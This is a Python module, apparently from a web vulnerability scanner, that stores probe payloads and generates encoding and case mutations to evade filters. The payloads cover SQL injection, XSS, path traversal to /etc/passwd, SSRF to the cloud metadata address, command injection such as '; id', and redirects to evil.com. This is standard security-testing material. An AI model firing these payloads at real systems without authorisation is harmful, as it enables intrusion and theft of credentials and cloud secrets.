"""
payload_engine.py
-----------------
Manages payload lists and provides mutation/encoding for various vulnerability types.
"""

import urllib.parse
import html

class PayloadEngine:
    """Holds payloads for each vulnerability type and generates mutations."""

    # Base payloads (expand as needed)
    SQLI = [
        "'",
        '"',
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT NULL--",
        "' AND SLEEP(5)--",
        "'; WAITFOR DELAY '00:00:05'--",
    ]
    XSS = [
        "<script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "<svg/onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "'-alert(1)-'",
    ]
    LFI = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "/etc/passwd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
    ]
    SSRF = [
        "http://127.0.0.1",
        "http://localhost",
        "http://169.254.169.254/latest/meta-data/",
        "file:///etc/passwd",
        "http://127.0.0.1:81/",          # Expect connection refused
    ]
    CMDI = [
        "; id",
        "&& whoami",
        "| ls",
        "`id`",
        "$(id)",
        "; sleep 5",
    ]
    OPEN_REDIRECT = [
        "https://evil.com",
        "//evil.com",
        "///evil.com",
        "https://google.com",
    ]

    @classmethod
    def get_payloads(cls, vuln_type: str, with_mutations: bool = True) -> list:
        """
        Return payloads for a given vulnerability type.
        If with_mutations is True, also return common mutations (URL encoded, HTML encoded, etc.).
        """
        base = getattr(cls, vuln_type.upper(), [])
        if not with_mutations:
            return base
        mutated = []
        for p in base:
            mutated.extend(cls._mutate(p))
        # Deduplicate
        seen = set()
        unique = []
        for p in mutated:
            if p not in seen:
                seen.add(p)
                unique.append(p)
        return unique

    @classmethod
    def _mutate(cls, payload: str) -> list:
        """Generate common mutations of a payload."""
        mutations = [payload]
        # URL encode
        mutations.append(urllib.parse.quote(payload))
        # Double URL encode
        mutations.append(urllib.parse.quote(urllib.parse.quote(payload)))
        # HTML entity encode (for XSS)
        mutations.append(html.escape(payload))
        # Case variation (for XSS tags)
        if payload.startswith("<") and payload.endswith(">"):
            mutated = payload[0] + payload[1:-1].swapcase() + payload[-1]
            mutations.append(mutated)
        # Insert comments for SQLi
        if "'" in payload:
            mutations.append(payload.replace(" ", "/**/"))
        return mutations